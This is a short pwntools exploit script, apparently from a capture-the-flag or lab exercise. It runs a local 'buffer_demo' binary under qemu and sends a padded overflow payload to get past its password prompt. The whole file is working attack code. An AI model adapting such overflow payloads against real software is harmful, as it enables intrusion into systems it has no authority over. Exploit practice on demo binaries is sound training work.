from pwn import *

elf = ELF("./buffer_demo")
pty = process.PTY
p = process(["qemu-x86_64", "./buffer_demo"], stdin=pty, stdout=pty)

#p.sendlineafter(b"password: ", b"secretpassword123")
p.sendlineafter(b": ", b"0" * 0x2c + b"555")

p.interactive()